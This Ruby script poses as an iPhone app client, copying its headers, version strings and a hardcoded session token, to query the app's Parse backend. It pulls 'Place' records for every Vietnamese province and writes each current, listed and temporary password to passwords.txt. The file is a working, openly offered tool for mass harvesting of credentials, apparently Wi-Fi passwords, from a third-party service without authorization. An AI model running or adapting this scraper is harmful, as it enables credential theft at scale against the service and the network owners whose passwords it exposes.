require 'json'
require 'pp'
require 'uri'
require 'net/http'
require 'net/https'

provinces = ["An Giang", "Bà Rịa-Vũng Tàu", "Bắc Giang", "Bắc Kạn", "Bạc Liêu", "Bắc Ninh", "Bến Tre", "Bình Định", "Bình Dương", "Bình Phước", "Bình Thuận", "Cà Mau", "Cao Bằng", "Đắk Lắk", "Đắk Nông", "Điện Biên", "Đồng Nai", "Đồng Tháp", "Gia Lai", "Hà Giang", "Hà Nam", "Hà Tĩnh", "Hải Dương", "Hậu Giang", "Hòa Bình", "Hưng Yên", "Khánh Hòa", "Kiên Giang", "Kon Tum", "Lai Châu", "Lâm Đồng", "Lạng Sơn", "Lào Cai", "Long An", "Nam Định", "Nghệ An", "Ninh Bình", "Ninh Thuận", "Phú Thọ", "Quảng Bình", "Quảng Nam", "Quảng Ngãi", "Quảng Ninh", "Quảng Trị", "Sóc Trăng", "Sơn La", "Tây Ninh", "Thái Bình", "Thái Nguyên", "Thanh Hóa", "Thừa Thiên Huế", "Tiền Giang", "Trà Vinh", "Tuyên Quang", "Vĩnh Long", "Vĩnh Phúc", "Yên Bái", "Phú Yên", "Cần Thơ", "Đà Nẵng", "Hải Phòng", "Hà Nội", "Hồ Chí Minh"]
request_uri = 'https://api.parse.com/2/find'

@post_json = {
    "appBuildVersion" => "1121",
    "appDisplayVersion" => "2.3.2",
    "classname" => "Place",
    "data" => {
        "city" => "",
        "country" => "Vietnam",
        "updatedAt" => {
            "$gte" => {
                "__type" =>  "Date",
                "iso" => "1970-01-01T00:00:00.000Z"
            }
        }
    },
    "iid" => "BCA4342D-M50B-4O5C-ADN3-BF40762A8693",
    "limit" => 100000,
    "order" => "updatedAt",
    "osVersion" => "Version 8.1.3 (Build 12B466)",
    "session_token" => "ELdm0xnnTRwyEHfeKNLe0trLY",
    "v" => "i1.4.2"
}

uri = URI.parse(request_uri)
https = Net::HTTP.new(uri.host,uri.port)
https.use_ssl = true
req = Net::HTTP::Post.new(uri.path, initheader = {'Host' => 'api.parse.com', 'Content-Type' =>'application/json; charset=utf-8', 'Connection' => 'keep-alive', 'Accept' => '*/*', 'User-Agent' => 'WC/1121 (iPhone; iOS 8.1.3; Scale/2.00)', 'Accept-Language' => 'en;q=1', 'Authorization' => 'OAuth oauth_signature="YOUR_OATH_SIGNATURE",                   oauth_signature_method="HMAC-SHA1",                   oauth_nonce="SOME_KIND_OF_STUPID_STRING", oauth_version="1.0",                   oauth_timestamp="THIS_IS_A_BIG_NUMBER",                   oauth_consumer_key="OBTAIN_IT_YOURSELF"'})

puts "Begining to ***. May take a while..."
total_items = 0
open('passwords.txt', 'a') do |f|
  provinces.each do |province|
    @post_json["data"]["city"] = province
    req.body = "#{@post_json.to_json}"
    province_count = 0
    begin
      items_count = 0
      res = https.request(req)
      r_data = JSON.parse(res.body)
      items_count += r_data["result"]["results"].count
      province_count += items_count
      r_data["result"]["results"].each do |password|
        f.puts password["data"]["currentPass"]
        password["data"]["passList"].each do |pl|
          f.puts pl["password"]
        end
        password["data"]["tempPassList"].each do |tp|
          f.puts tp["password"]
        end
      end
      @post_json["data"]["updatedAt"]["$gte"]["iso"] = r_data["result"]["results"].last["data"]["updatedAt"]
      req.body = "#{@post_json.to_json}"
      total_items += items_count
      # sleep 0.3
    end while items_count > 1
    @post_json["data"]["updatedAt"]["$gte"]["iso"] = "1970-01-01T00:00:00.000Z"
    puts "Done for #{province}. Code: #{res.code}, message: #{res.message}, #{province_count} lines."
  end
end

puts "Finished! Total lines: #{total_items}\n\n"

